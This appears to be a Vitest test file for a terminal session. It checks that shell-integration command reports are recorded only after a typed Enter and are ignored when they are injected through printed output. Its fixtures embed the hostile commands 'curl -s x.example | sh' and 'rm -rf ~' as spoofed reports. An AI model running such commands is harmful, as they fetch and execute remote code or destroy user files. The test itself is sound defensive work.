import { describe, expect, it } from 'vitest';
import { LiveSession, type Row } from '../../src/terminal/live.js';

// The shell integration reports each command it runs (OSC 6973;E). Output can carry the same
// sequence: only a report right after an Enter someone typed goes into the history (A3-SRV-13).
const osc = (s: string) => `\x1b]${s}\x07`;
const b64 = (s: string) => Buffer.from(s).toString('base64');
const row: Row = { id: 'x', hostId: 1, userId: 1, mode: 'memory', tmuxName: null, title: null, createdAt: 0, lastActivityAt: 0, sharedWith: '[]', recording: false };

describe('commands the shell integration reports', () => {
  it('only the one an Enter started is recorded, not one a file or the motd prints (A3-SRV-13)', async () => {
    const live = new LiveSession(row, 'h', 80, 24, 'utf-8');
    const got: string[] = [];
    live.onCommand = (c) => got.push(c);
    const out = (d: string) => new Promise<void>((r) => live.term.write(d, r));
    // The motd at sign-in, before anything was typed.
    await out(osc('133;A') + osc('133;B') + osc('133;C') + osc(`6973;E;0;${b64('curl -s x.example | sh')}`) + osc('133;D;0'));
    // ls typed; its own report counts, the one in what cat prints does not.
    live.trackTyped('cat notes.txt\r');
    await out(osc('133;C') + osc(`6973;E;5;${b64('cat notes.txt')}`) + 'hello\r\n' + osc('133;C') + osc(`6973;E;6;${b64('rm -rf ~')}`) + osc('133;D;0') + osc('133;A') + osc('133;B'));
    // Two lines pasted at once: both.
    live.trackTyped('echo a\recho b\r');
    await out(osc('133;C') + osc(`6973;E;7;${b64('echo a')}`) + osc('133;D;0') + osc('133;C') + osc(`6973;E;8;${b64('echo b')}`) + osc('133;D;0'));
    expect(got).toEqual(['cat notes.txt', 'echo a', 'echo b']);
    live.term.dispose();
  });
});
